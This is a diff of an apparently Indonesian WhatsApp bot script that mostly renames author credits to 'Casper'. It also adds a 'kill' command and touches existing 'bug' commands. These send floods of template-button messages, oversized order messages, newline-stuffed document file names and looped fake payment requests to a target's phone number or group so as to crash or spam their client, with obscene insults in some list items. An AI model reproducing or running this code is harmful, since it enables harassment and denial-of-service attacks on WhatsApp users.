@@ -2,13 +2,13 @@
 // Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
    Apalagi Lari Dari Tanggung Jawab
 
-// Base ᴀʀғᴀɴHw Mods : Copyan Dari Base Dika
+// Base CasperHw Mods : Copyan Dari Base Dika
 
-› Create By ᴀʀғᴀɴ
-› Base Ori ᴀʀғᴀɴ
+› Create By Casper
+› Base Ori Casper
 › Copyan Base Dika haikal Morou
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : ᴀʀғᴀɴ*/
+🌷 KALAU MAU RENAME TARO CREDITS GUA : Casper*/
 
 //=================================================//
 require('./hwkal')
@@ -258,7 +258,7 @@ const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC ᴀʀғᴀɴ`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted:m})} 
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC Casper`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted:m})} 
 //=================================================//
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
@@ -663,7 +663,7 @@ jpegThumbnail:log0,
 caption:`Haii 👋 Kak ${pushname} Selamat ${salam} Ini Adalah Bot Khusus Group
 Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot Hw Mods'
  `,
-footer: '© ᴀʀғᴀɴ',
+footer: '© Casper',
 templateButtons: templateButtonoos
 }
 haikal.sendMessage(m.chat, templateMessaggge)
@@ -688,7 +688,7 @@ Haii 👋 Kak ${pushname} Selamat ${salam}
 🌷 Total User : ${_registered.length}
 
 *Silahkan Ketik Menu Untuk Menggunakan Bot`,
-footer: '© ᴀʀғᴀɴ',
+footer: '© Casper',
 templateButtons: templateButtonoos
 }
 haikal.sendMessage(m.chat, templateMessaggge)
@@ -1014,7 +1014,7 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
 {
-haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC ᴀʀғᴀɴ`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Casper`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -1062,14 +1062,14 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 touchmebre = [
 {
-title: `🌷 ᴀʀғᴀɴ WA 🌷 ${buttonvirus} ${buttonvirus}`,
+title: ` Casper ${buttonvirus} ${buttonvirus}`,
 rows: [
 {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
 {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
 ]
 }
 ]
-haikal.sendListMsg(Pe, `🌷 ᴀʀғᴀɴ WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
+haikal.sendListMsg(Pe, `Casper`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here `, touchmebre, m)
 break
 //=================================================//
 case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
@@ -1083,7 +1083,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY ᴀʀғᴀɴ",
+"message": " BY Casper",
 "orderTitle": " BUG TROLI ", // 
 "sellerJid": "62895403595055@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -1126,7 +1126,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 ᴀʀғᴀɴ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 Casper☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -1337,7 +1337,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© ᴀʀғᴀɴ${ngazap(prefix)}`,
+"caption": `© Casper${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1355,7 +1355,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© ᴀʀғᴀɴ${ngazap(prefix)}`,
+"caption": `© Casper${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted:m})
@@ -1375,9 +1375,9 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© ᴀʀғᴀɴ${ngazap(prefix)}`,
+"message": `© Casper${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© ᴀʀғᴀɴ${ngazap(prefix)}`,
+"orderTitle": `© Casper${ngazap(prefix)}`,
 "sellerJid": "6285714170944@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
@@ -1475,7 +1475,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER ᴀʀғᴀɴ`,
+"text": `MY DEVELOPER Casper`,
 }
 }}), { userJid: m.chat, quoted:m})
 haikal.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -1490,7 +1490,7 @@ if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nConto
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
-haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC ᴀʀғᴀɴ`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Casper`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -1505,7 +1505,7 @@ case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': c
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1516,7 +1516,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1527,7 +1527,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1538,7 +1538,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1549,7 +1549,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1560,7 +1560,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1571,7 +1571,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1582,7 +1582,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1593,7 +1593,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1604,7 +1604,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1615,7 +1615,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1626,7 +1626,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1637,7 +1637,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1648,7 +1648,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1659,7 +1659,178 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+ reply('sukses Bug target')
+}
+break
+case 'kill' ️: {
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
+Pe = text.split("|")[0]+'@s.whatsapp.net'
+ haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+ haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+ haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+ haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
+templateButtons: [
+{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
+{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
+{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
+{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
+{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
+], 
+ })
+haikal.sendMessage(Pe, { 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1676,7 +1847,7 @@ case '🌹' : {
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@g.us'
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1687,7 +1858,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1698,7 +1869,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
